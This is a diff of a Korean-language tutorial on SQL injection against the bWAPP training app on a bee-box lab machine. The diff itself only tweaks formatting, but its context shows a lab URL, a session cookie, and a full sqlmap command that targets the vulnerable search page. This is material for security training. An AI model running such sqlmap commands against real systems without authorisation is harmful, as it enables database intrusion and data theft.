@@ -165,11 +165,10 @@ SQL 인젝션 후 웹 브라우저에서 데이터베이스에 저장된 users �
 
 - 페이지 주소 : http://bee-box/bWAPP/sqli_1.php?title=man&action=search
 
-- cookie 값
+- cookie 값 :
 
 브라우저 개발도구(F12)의 Storage 확인
 ![sqlmap1](https://user-images.githubusercontent.com/76420201/106384529-aa097b80-640e-11eb-91c2-17fa5d13baf7.gif)
-
 PHPSESSID = fc13d1925d717ec8ff2ec1f6e6182f34<br>
 security_level = 0
 
@@ -182,7 +181,7 @@ security_level = 0
 └─$ sudo sqlmap -u "http://bee-box/bWAPP/sqli_1.php?title=man&action=search" --cookie="PHPSESSID=fc13d1925d717ec8ff2ec1f6e6182f34; security_level=0"
 ```
 
-<center><img src = "https://user-images.githubusercontent.com/76420201/106384672-6d8a4f80-640f-11eb-992a-3b0a7db2a87b.gif" width = "80%"></center>
+<center><img src = "https://user-images.githubusercontent.com/76420201/106384672-6d8a4f80-640f-11eb-992a-3b0a7db2a87b.gif" width = "100%"></center>
 
 ---
 
